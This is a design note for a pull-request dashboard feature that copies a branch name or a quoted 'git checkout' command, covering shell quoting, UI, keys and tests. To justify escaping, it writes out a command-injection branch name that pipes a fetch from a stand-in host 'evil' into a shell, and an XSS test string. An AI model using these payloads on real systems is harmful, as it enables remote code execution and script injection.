# Copy a pull request's branch and its checkout command

**Date:** 2026-10-27
**Issue:** none (asked by the user on 2026-10-27)
**Target version:** 3.2.0

Reviewed with the user: the placement (icons after the title), the keys
(`c`, `b`) and the module (option A below). The rest is *Decided*.

## 1. Problem

To work on a pull request locally, its source branch has to be found in
Bitbucket and typed or copied by hand: the row shows no branch name (only
the root branches have a header). The user wants two buttons on each
pull request: one copying `git checkout <branch>`, one copying the branch
name.

## 2. Data

`pullRequest.source.branch.name` is already in every pull request of
`/api/pull-requests/:project`, in the fixtures too. No server change.

## 3. Design

### 3.1 What is copied

- **Branch name**: `source.branch.name` as it is.
- **Checkout command**: `git checkout <branch>`, from a pure
  `checkoutCommand(branch)`. *Decided*: a branch name is untrusted text
  that ends up in a shell. Git allows `$`, `;`, `|`, `&`, `` ` ``, `(`,
  `)`, `<`, `>`, `!`, `#`, `{`, `}` and both quotes in a branch name, so
  anyone who can push may name a branch ``x;curl${IFS}evil|sh``, and
  pasting the command would run it. A name made only of letters, digits
  and `. _ / - + @ = , %` is left bare (`git checkout feature/ABC-1-export`);
  any other is put in single quotes, each `'` in it written `'\''`
  (`git checkout 'x;curl${IFS}evil|sh'`). Git forbids spaces, control
  characters and `~ ^ : ? * [ \` in a branch name.
- **Read by git as a branch only** (after the review of the branch): the
  command ends with `--` (`git checkout feature/x --`). Without it, a name
  that is also a path of the repository (`docs`), not fetched yet, makes
  `git checkout docs` restore that path from the index, losing its
  changes; with it, git creates the branch from a fetched remote branch as
  before, and fails ("invalid reference") otherwise. A name starting with
  `-` follows `--end-of-options` (`git checkout --end-of-options -f --`):
  `git check-ref-format --branch` refuses a leading `-`, but
  `refs/heads/-f` can be pushed, and `git checkout -f` would throw the
  uncommitted changes away. Both checked with git 2.54 and zsh.
- **A pull request from a fork** (#127): the same command, although the
  branch is not in the destination clone. *Decided*: #127 covers forks
  across the page; a comment there records this case.

### 3.2 The row

Two `<button type="button" class="copy-button …">` right after the title
and the Draft badge, in the pull request's header:

| Button | Class | Icon | Copies | Accessible name |
|---|---|---|---|---|
| Branch | `copy-branch` | `fas fa-copy` | the branch name | Copy the branch name `<branch>` |
| Checkout | `copy-checkout` | `fas fa-terminal` | `checkoutCommand(branch)` | Copy `<command>` |

Each carries what it copies in `data-copy`, and `title="Copy: <text>"`;
every interpolated text goes through `escapeHtml` (NFR-SEC7); the icons
are `aria-hidden`. No inline handler, no `style=` attribute.

The icons are drawn in `--text-muted` (4.5:1 on the surface in both
themes), in `--text-color` when the row is hovered, holds the focus
(`:focus-within`) or is selected. Never hidden, so they stay discoverable
and clickable without hovering first; the 2px `:focus-visible` outline of
every control applies. Root-branch headers and orphaned issues get no
buttons: a root branch is a destination (`master`), an orphaned issue has
no branch.

### 3.3 Copying and feedback

A new module, `public/copy-branch.js`:

- `checkoutCommand(branch)`: §3.1, pure.
- `handleCopyClick(event, options)`: returns `false` for a click outside
  a `.copy-button`; otherwise writes the button's `data-copy` with
  `navigator.clipboard.writeText` and returns `true`. `options` carries
  the clipboard, the status element and the timer functions, so the tests
  pass fakes; the defaults read `navigator` and `document` at call time,
  never at import time.
- **Success**: the button gets the class `copied`, its icon becomes
  `fa-check` in `--success-strong`, for 1.5 s; the status region says
  "Copied <text>".
- **Failure**: the clipboard API is missing outside a secure context (the
  page opened over plain http through `PR_TREE_HOST`), or `writeText`
  rejects (the document not focused, a permission refused). The button gets
  the class `copy-failed`, its icon becomes `fa-times` in `--error-strong`,
  its title and the status region give the reason, for 1.5 s. Missing API:
  "Copy failed: the clipboard needs https or localhost"; a rejection:
  "Copy failed: <message>".
- A second click within the 1.5 s restarts the period; the original icon,
  title and class come back after it.
- **Status region**: one `<span id="copyStatus" class="visually-hidden"
  role="status">` in index.html, outside the tree pane, so a re-render
  never replaces it. `.visually-hidden` is the usual clip pattern, new in
  styles.css.
- A re-render of the tree during the 1.5 s drops the feedback with the
  old button; the reset then touches a detached element, harmlessly.

**Wiring**: app.js keeps one click listener on the tree pane (pitfall
14), composing the two handlers:
`treePane.addEventListener('click', event => handleCopyClick(event) || handleTreeClick(event))`.
A click on a copy button toggles nothing either way (it is no toggle
button and not in a branch or a repository header), but the composition
says so explicitly. The click focuses the button, so the `focusin`
listener selects the row, as for the title link.

### 3.4 Keys

In `handleTreeKey` (tree-keyboard.js), on the row in sight:

- `c` clicks its `.copy-checkout` button,
- `b` clicks its `.copy-branch` button,

as `o` and `i` click a link today (`openLink` becomes a `clickIn(row,
selector)` shared by the four). The feedback is the click's. On a
root-branch header or an orphaned issue, or with no row, the key is not
taken. app-shell.js's guards (typing, modifiers, help, open multi-select,
drawer) apply unchanged; neither key is used elsewhere.

## 4. Turned down

- **Copy logic in `handleTreeClick`** (option B): one fewer import in
  app.js, but tree-toggle.js would mix copying into folding.
- **Copy actions in the title popover** (option C): hover-only, hard to
  find, and the popover holds Bitbucket's rendered HTML.
- **The branch name shown on the row**: the user chose icons only; the
  tooltip shows the exact text copied.
- **Icons hidden until hover**: invisible to the keyboard and to a first
  look; muted is enough.
- **`git fetch && git checkout`**: the user asked for `git checkout`;
  git's DWIM creates the tracking branch from a fetched remote branch.
- **`git switch <branch>`** (never reads a path): the user asked for
  `git checkout`; the trailing `--` gives it the same safety.
- **`document.execCommand('copy')` fallback** over plain http: deprecated;
  the dashboard runs on localhost, and the failure says why.
- **Buttons on root-branch headers**: a destination branch is checked out
  already, or copied from Bitbucket; nothing asked for it.

## 5. Tests

- `test/copy-branch.test.mjs`: `checkoutCommand` (a plain name; `$`, `;`,
  `|`, a backtick, `'` quoted; a `'` escaped); `handleCopyClick` on fake
  elements with a fake clipboard and timer: a click elsewhere returns
  `false` and writes nothing; a click on the button or its icon writes
  `data-copy`, sets `copied`, the check icon and the status text, and
  resets after the timer; a missing clipboard and a rejection set
  `copy-failed` with their reasons; a second click restarts the timer.
- `test/app-render.test.mjs`: both buttons on each pull request, their
  `data-copy`, `aria-label` and `title`, a hostile branch name
  (`"><img src=x onerror=alert(1)>` and ``a;b`c``) escaped in every
  attribute; none on root-branch headers nor orphaned issues.
- `test/tree-keyboard.test.mjs`: `c` and `b` click the right button of
  the pull request in sight; not taken on a header, an orphaned issue, or
  with no row.
- `test/server.test.mjs`: unchanged checks cover the new element ids and
  the absence of inline handlers; the status region is checked present.
- `test/styles.test.mjs`: the existing checks cover the new `color`
  declarations (strong tokens, muted text).
- Manual, fixture mode: click both buttons, paste, check the feedback;
  `c` and `b` on a selected row; both themes; hover, focus, selected.

## 6. Documentation

README.md: a changelog entry for 3.2.0 and the `c` / `b` keys in the
keyboard paragraph of the features (the other one is the 3.1.0 changelog
entry, released). PRD.md: a requirement line for the copy buttons and
the keys. package.json: 3.2.0 and its release date.
